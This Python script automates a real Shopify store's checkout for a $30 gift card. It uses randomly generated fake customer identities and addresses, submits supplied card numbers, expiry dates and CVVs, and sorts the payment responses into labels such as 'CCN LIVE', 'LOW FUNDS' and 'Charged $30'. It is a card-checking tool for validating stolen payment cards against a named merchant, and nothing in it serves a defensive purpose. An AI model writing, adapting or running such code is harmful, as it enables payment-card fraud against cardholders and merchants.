import time
from urllib.request import urlopen 
import requests
from rand_user import random_user_api

from random_address import real_random_address


def find_between( data, first, last ):
    try:
        start = data.index( first ) + len( first )
        end = data.index( last, start )
        return data[start:end]
    except ValueError:
        return None

# r = requests.Session()


def sho_one(r,rand_user, ):
    addr = real_random_address()
    a= r.get('https://thursdayboots.com/products/gift-cards')

    varient_id = find_between(a.text, 'variantId":',',')

    if not a or not varient_id:
        return

    json_one = {
    "id": varient_id,
    "quantity": 1,
    "properties": {}
}

    b = r.post('https://thursdayboots.com/cart/add.js',data = json_one) # 


    if not b:
        return
    d = r.get('https://thursdayboots.com/checkout')

    if not d: return
    
    auth_token = find_between(d.text, 'type="hidden" name="authenticity_token" value="','"')

    if not d or not auth_token:return

    checkout_url = d.url
    dic = {
'_method': 'patch',
'authenticity_token': auth_token,
'previous_step': 'contact_information',
'step': 'shipping_method',
'checkout[email]': rand_user.email,
'checkout[billing_address][first_name]': rand_user.first_name,
'checkout[billing_address][last_name]': rand_user.last_name,
'checkout[billing_address][address1]': addr['address1'],
'checkout[billing_address][address2]': '',
'checkout[billing_address][city]': addr['city'],
'checkout[billing_address][country]': 'US',
'checkout[billing_address][province]': addr['state'],
'checkout[billing_address][zip]': addr['postalCode'],
'checkout[billing_address][phone]': rand_user.phone,
'checkout[billing_address][first_name]': rand_user.first_name,
'checkout[billing_address][last_name]': rand_user.last_name,
'checkout[billing_address][address1]': addr['address1'],
'checkout[billing_address][address2]': '',
'checkout[billing_address][city]': addr['city'],
'checkout[billing_address][country]': 'United States',
'checkout[billing_address][province]':  addr['state'],
'checkout[billing_address][zip]': addr['postalCode'],
'checkout[billing_address][phone]': rand_user.phone,
'checkout[remember_me]': '',
'checkout[remember_me]': '0',
'checkout[client_details][browser_width]': '674',
'checkout[client_details][browser_height]': '667',
'checkout[client_details][javascript_enabled]': '1',
'checkout[client_details][color_depth]': '24',
'checkout[client_details][java_enabled]': 'false',
'checkout[client_details][browser_tz]': '-330',
'button': '',
}
    e = r.post(checkout_url, data = dic)
    payment_gateway = find_between(e.text,'data-subfields-for-gateway="','"')
    if not e or not payment_gateway: return
    return auth_token,checkout_url, payment_gateway



def sho_two(r,rand_user, cc,mes,ano,cvv, payment_gateway,checkout_url, auth_token):
    json_four = {
        "credit_card": {
            "number": cc,
            "name": rand_user.name,
            "month": mes,
            "year": ano,
            "verification_value": cvv
        },
        "payment_session_scope": "thursdayboots.com"
    }

    four = r.post('https://deposit.us.shopifycs.com/sessions', json = json_four)
    if 'id' not in four.json(): return
    dic = {
    '_method': 'patch',
    'authenticity_token': auth_token,
    'previous_step': 'payment_method',
    'step': '',
    's': four.json()['id'],
    'checkout[payment_gateway]': payment_gateway,
    'checkout[credit_card][vault]': 'false',
    'checkout[total_price]': '3000',
    'complete': '1',
    'checkout[client_details][browser_width]': '691',
    'checkout[client_details][browser_height]': '667',
    'checkout[client_details][javascript_enabled]': '1',
    'checkout[client_details][color_depth]': '24',
    'checkout[client_details][java_enabled]': 'false',
    'checkout[client_details][browser_tz]': '-330',
    }
    g = r.post(checkout_url, data = dic)
    time.sleep(5)
    if not g or 'processing' not in g.url:
        return
    g = r.get(checkout_url + '/processing?from_processing_page=1',)
    # with open('g.txt', 'w') as w: w.write(f.text)
    return g.text





def get_response_sho_br(text):
    if 'thank you' in text:
        r_text, r_logo, r_respo = "Charged $30", "✅", 'Approved'
        return r_text, r_logo, r_respo
    text1 = random_user_api.find_between(text, '<p class="notice__text">','</p></div></div>')
    text = text1 if len(text1) > 2 else text
    if "2038" in text or "2046" in text:
        r_text, r_logo, r_respo = "DECLINED", "❌", 'Rejected'
    elif "2005" in text:
        r_text, r_logo, r_respo = "INCORRECT NUMBER", "❌", 'Rejected'
    elif "2059" in text or "2060" in text :
        r_text, r_logo, r_respo = "ZIP INCORRECT", "✅", 'Approved'
    elif "2001"  in text:
        r_text, r_logo, r_respo = "LOW FUNDS", "✅", 'Approved'
    elif "2010" in text:
        r_text, r_logo, r_respo = "CCN LIVE", "✅", 'Ccn Approved'
    elif "2015" in text or "2023" in text:
        r_text, r_logo, r_respo = "PURCHASE NOT SUPPORTED", "❌", 'Rejected'
    elif "Customer authentication is required" in text or "unable to authenticate" in text or "three_d_secure_redirect" in text or "hooks.stripe.com/redirect/" in text or 'requires an authorization' in text or 'card_error_authentication_required' in text:
        r_text, r_logo, r_respo = "3D SECURITY", "❌", 'Rejected'
    elif "2004" in  text or "2006" in text:
        r_text, r_logo, r_respo = "EXPIRED CARD", "❌", 'Rejected'
    elif '"seller_message": "Payment complete."' in text or '"cvc_check": "pass"' in text or 'thank_you' in text or '"type":"one-time"' in text or '"state": "succeeded"' in text or "Your payment has already been processed" in text or '"status": "succeeded"' in text or 'Thank' in text:
        r_text, r_logo, r_respo = "Charged $30", "✅", 'Approved'
    else:
        r_text, r_logo, r_respo = "DECLINED", "❌", 'Rejected'
    r_text1 = text1.replace('-','') if len(text1) > 2 else r_text
    return r_text1,r_logo,r_respo,r_text

